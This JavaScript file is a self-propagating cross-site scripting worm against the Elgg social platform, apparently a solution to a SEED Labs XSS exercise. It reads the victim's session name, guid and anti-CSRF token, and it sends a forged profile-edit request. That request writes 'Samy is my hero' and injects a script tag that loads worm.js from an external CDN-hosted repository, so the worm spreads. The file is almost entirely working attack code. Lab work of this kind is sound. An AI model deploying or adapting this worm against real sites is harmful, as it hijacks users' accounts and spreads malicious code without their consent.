alert('here');
window.onload = function(){
  // get the name and guid of the victim (we don't want to change those)
  var userName="&name="+elgg.session.user.name;
  var guid="&guid="+elgg.session.user.guid;
  // get the timestamp and token, so this request is not rejected by Elgg server
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="__elgg_token="+elgg.security.token.__elgg_token;
  
  var sendurl = "http://www.seed-server.com/action/profile/edit";
  // the payload of the HTTP POST request 
  var content = token + ts + userName 
                + "&briefdescription=Samy is my hero"  /// leave a note that worm was here
                + "&accesslevel[briefdescription]=2" 
                + "&description=<script type='text/javascript' src='https://cdn.jsdelivr.net/gh/losmi247/worm@main/worm.js'></script>"
                + "&accesslevel[description]=2" + guid;
  var samyGuid = 59;          
  if(elgg.session.user.guid != samyGuid) { // don't overwrite Samy's own 'About Me'
    //Create and send Ajax request to modify profile
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
  }
}
